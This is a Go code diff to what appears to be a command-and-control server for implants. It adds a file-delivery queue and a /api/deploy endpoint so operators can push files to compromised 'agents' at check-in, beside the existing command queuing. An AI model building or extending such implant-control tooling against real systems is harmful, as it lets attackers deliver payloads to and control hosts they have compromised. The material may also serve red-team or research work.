@@ -31,6 +31,7 @@ type Listener struct {
 	sessions map[string]*ImplantSession
 	commands map[string][]QueuedCommand
 	results  map[string][]CommandResult
+	files    map[string][]FileDelivery
 }
 
 // ImplantSession represents a connected implant.
@@ -66,10 +67,11 @@ type CheckinRequest struct {
 	Metadata  map[string]string `json:"metadata,omitempty"`
 }
 
-// CheckinResponse is returned to implants with pending commands.
+// CheckinResponse is returned to implants with pending commands and file deliveries.
 type CheckinResponse struct {
 	SessionID string          `json:"session_id"`
 	Commands  []QueuedCommand `json:"commands,omitempty"`
+	Files     []FileDelivery  `json:"files,omitempty"`
 	Interval  int             `json:"interval"`
 }
 
@@ -88,6 +90,7 @@ func (l *Listener) Start() error {
 	l.sessions = make(map[string]*ImplantSession)
 	l.commands = make(map[string][]QueuedCommand)
 	l.results = make(map[string][]CommandResult)
+	l.files = make(map[string][]FileDelivery)
 	l.Running = true
 
 	mux := http.NewServeMux()
@@ -103,6 +106,9 @@ func (l *Listener) Start() error {
 
 	// Operator API — queue command
 	mux.HandleFunc("/api/command", l.handleQueueCommand)
+
+	// File delivery and deploy endpoints
+	l.addDeployRoutes(mux)
 
 	// Health check
 	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
@@ -129,6 +135,8 @@ func (l *Listener) Start() error {
 	fmt.Println("    POST /result       — Command result submission")
 	fmt.Println("    GET  /api/sessions — List active sessions")
 	fmt.Println("    POST /api/command  — Queue command for session")
+	fmt.Println("    POST /api/deploy   — Upload and deploy file to agent")
+	fmt.Println("    GET  /api/files    — List pending file deliveries")
 	fmt.Println("    GET  /health       — Health check")
 
 	if l.Protocol == "https" {
@@ -220,9 +228,18 @@ func (l *Listener) handleCheckin(w http.ResponseWriter, r *http.Request) {
 		fmt.Printf("[*] Dispatching %d command(s) to session %s\n", len(cmds), sessionID[:8])
 	}
 
+	// Drain file delivery queue for this session
+	var files []FileDelivery
+	if pending, ok := l.files[sessionID]; ok && len(pending) > 0 {
+		files = pending
+		delete(l.files, sessionID)
+		fmt.Printf("[*] Dispatching %d file(s) to session %s\n", len(files), sessionID[:8])
+	}
+
 	resp := CheckinResponse{
 		SessionID: sessionID,
 		Commands:  cmds,
+		Files:     files,
 		Interval:  5,
 	}
 
